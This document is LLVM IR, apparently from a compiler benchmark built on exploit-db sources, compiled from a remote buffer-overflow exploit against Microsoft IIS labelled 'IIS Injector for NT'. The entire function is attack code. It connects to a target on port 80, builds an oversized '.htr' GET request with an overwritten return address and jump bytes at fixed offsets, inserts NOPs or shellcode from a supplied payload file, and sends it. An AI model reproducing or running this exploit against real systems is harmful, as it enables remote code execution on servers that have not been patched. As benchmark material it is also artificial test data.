; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19248.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19248.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_6__ = type { %struct.TYPE_5__, i32, i32 }
%struct.TYPE_5__ = type { %struct.TYPE_4__ }
%struct.TYPE_4__ = type { i32 }
%struct.sockaddr = type { i32 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [114 x i8] c"IIS Injector for NT\0Awritten by Greg Hoglund, http://www.rootkit.com\0AUsage: %s <targetip> <optional payload file>\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@INVALID_SOCKET = common dso_local global i64 0, align 8
@main.theSploit = internal global [4096 x i8] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"get /\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"BBBB.htr HTTP/1.0\0D\0A\0D\0A\00\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"rb\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.TYPE_6__, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  %11 = alloca i32*, align 8
  %12 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  store i64 0, i64* %5, align 8
  %13 = load i32, i32* %3, align 4
  %14 = icmp slt i32 %13, 2
  br i1 %14, label %15, label %22

15:                                               ; preds = %2
  %16 = load i32, i32* @stderr, align 4
  %17 = load i8**, i8*** %4, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @fprintf(i32 %16, i8* getelementptr inbounds ([114 x i8], [114 x i8]* @.str, i64 0, i64 0), i8* %19)
  %21 = call i32 @exit(i32 0) #3
  unreachable

22:                                               ; preds = %2
  %23 = call i32 @MAKEWORD(i32 2, i32 0)
  %24 = call i32 @WSAStartup(i32 %23, i32* %6)
  %25 = load i32, i32* @AF_INET, align 4
  %26 = load i32, i32* @SOCK_STREAM, align 4
  %27 = load i32, i32* @IPPROTO_TCP, align 4
  %28 = call i64 @socket(i32 %25, i32 %26, i32 %27)
  store i64 %28, i64* %5, align 8
  %29 = load i64, i64* @INVALID_SOCKET, align 8
  %30 = load i64, i64* %5, align 8
  %31 = icmp ne i64 %29, %30
  br i1 %31, label %32, label %134

32:                                               ; preds = %22
  %33 = load i32, i32* @AF_INET, align 4
  %34 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %7, i32 0, i32 2
  store i32 %33, i32* %34, align 4
  %35 = call i32 @htons(i32 80)
  %36 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %7, i32 0, i32 1
  store i32 %35, i32* %36, align 4
  %37 = load i8**, i8*** %4, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @inet_addr(i8* %39)
  %41 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %7, i32 0, i32 0
  %42 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %41, i32 0, i32 0
  %43 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %42, i32 0, i32 0
  store i32 %40, i32* %43, align 4
  %44 = load i64, i64* %5, align 8
  %45 = bitcast %struct.TYPE_6__* %7 to %struct.sockaddr*
  %46 = call i64 @connect(i64 %44, %struct.sockaddr* %45, i32 4)
  %47 = icmp eq i64 0, %46
  br i1 %47, label %48, label %131

48:                                               ; preds = %32
  store i8 122, i8* %8, align 1
  store i8 65, i8* %9, align 1
  store i32 0, i32* %10, align 4
  br label %49

49:                                               ; preds = %90, %48
  %50 = load i32, i32* %10, align 4
  %51 = icmp slt i32 %50, 4096
  br i1 %51, label %52, label %93

52:                                               ; preds = %49
  %53 = load i8, i8* %8, align 1
  %54 = load i32, i32* %10, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 %55
  store i8 %53, i8* %56, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load i32, i32* %10, align 4
  %59 = add nsw i32 %58, 1
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 %60
  store i8 %57, i8* %61, align 1
  %62 = load i8, i8* %9, align 1
  %63 = sext i8 %62 to i32
  %64 = add nsw i32 %63, 1
  %65 = trunc i32 %64 to i8
  %66 = load i32, i32* %10, align 4
  %67 = add nsw i32 %66, 2
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 %68
  store i8 %65, i8* %69, align 1
  %70 = load i8, i8* %9, align 1
  %71 = sext i8 %70 to i32
  %72 = add nsw i32 %71, 2
  %73 = trunc i32 %72 to i8
  %74 = load i32, i32* %10, align 4
  %75 = add nsw i32 %74, 3
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds [4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 %76
  store i8 %73, i8* %77, align 1
  %78 = load i8, i8* %9, align 1
  %79 = add i8 %78, 1
  store i8 %79, i8* %9, align 1
  %80 = sext i8 %79 to i32
  %81 = icmp eq i32 %80, 89
  br i1 %81, label %82, label %89

82:                                               ; preds = %52
  store i8 65, i8* %9, align 1
  %83 = load i8, i8* %8, align 1
  %84 = add i8 %83, -1
  store i8 %84, i8* %8, align 1
  %85 = sext i8 %84 to i32
  %86 = icmp slt i32 %85, 97
  br i1 %86, label %87, label %88

87:                                               ; preds = %82
  store i8 97, i8* %8, align 1
  br label %88

88:                                               ; preds = %87, %82
  br label %89

89:                                               ; preds = %88, %52
  br label %90

90:                                               ; preds = %89
  %91 = load i32, i32* %10, align 4
  %92 = add nsw i32 %91, 4
  store i32 %92, i32* %10, align 4
  br label %49

93:                                               ; preds = %49
  %94 = call i32 @_snprintf(i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 0), i32 5, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0))
  %95 = call i32 @_snprintf(i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 3005), i32 22, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  store i8 -16, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 598), align 2
  store i8 -116, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 599), align 1
  store i8 -8, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 600), align 8
  store i8 119, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 601), align 1
  store i8 -112, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 594), align 2
  store i8 -21, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 595), align 1
  store i8 53, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 596), align 4
  store i8 -112, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 597), align 1
  %96 = load i32, i32* %3, align 4
  %97 = icmp slt i32 %96, 3
  br i1 %97, label %98, label %99

98:                                               ; preds = %93
  store i8 -112, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 650), align 2
  store i8 -112, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 651), align 1
  store i8 -112, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 652), align 4
  store i8 -112, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 653), align 1
  store i8 -52, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 654), align 2
  store i8 -52, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 655), align 1
  store i8 -52, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 656), align 16
  store i8 -52, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 657), align 1
  store i8 -112, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 658), align 2
  store i8 -112, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 659), align 1
  store i8 -112, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 660), align 4
  store i8 -112, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 661), align 1
  br label %127

99:                                               ; preds = %93
  %100 = load i8**, i8*** %4, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 2
  %102 = load i8*, i8** %101, align 8
  %103 = call i32* @fopen(i8* %102, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0))
  store i32* %103, i32** %11, align 8
  %104 = load i32*, i32** %11, align 8
  %105 = icmp ne i32* %104, null
  br i1 %105, label %106, label %126

106:                                              ; preds = %99
  store i32 650, i32* %12, align 4
  br label %107

107:                                              ; preds = %116, %106
  %108 = load i32*, i32** %11, align 8
  %109 = call i32 @feof(i32* %108)
  %110 = icmp ne i32 %109, 0
  br i1 %110, label %114, label %111

111:                                              ; preds = %107
  %112 = load i32, i32* %12, align 4
  %113 = icmp slt i32 %112, 3000
  br label %114

114:                                              ; preds = %111, %107
  %115 = phi i1 [ false, %107 ], [ %113, %111 ]
  br i1 %115, label %116, label %123

116:                                              ; preds = %114
  %117 = load i32*, i32** %11, align 8
  %118 = call signext i8 @fgetc(i32* %117)
  %119 = load i32, i32* %12, align 4
  %120 = add nsw i32 %119, 1
  store i32 %120, i32* %12, align 4
  %121 = sext i32 %119 to i64
  %122 = getelementptr inbounds [4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 %121
  store i8 %118, i8* %122, align 1
  br label %107

123:                                              ; preds = %114
  %124 = load i32*, i32** %11, align 8
  %125 = call i32 @fclose(i32* %124)
  br label %126

126:                                              ; preds = %123, %99
  br label %127

127:                                              ; preds = %126, %98
  %128 = load i64, i64* %5, align 8
  %129 = call i32 @strlen(i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 0))
  %130 = call i32 @send(i64 %128, i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.theSploit, i64 0, i64 0), i32 %129, i32 0)
  br label %131

131:                                              ; preds = %127, %32
  %132 = load i64, i64* %5, align 8
  %133 = call i32 @closesocket(i64 %132)
  br label %134

134:                                              ; preds = %131, %22
  ret void
}

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @WSAStartup(i32, i32*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i64 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i64 @connect(i64, %struct.sockaddr*, i32) #1

declare dso_local i32 @_snprintf(i8*, i32, i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @feof(i32*) #1

declare dso_local signext i8 @fgetc(i32*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @send(i64, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @closesocket(i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
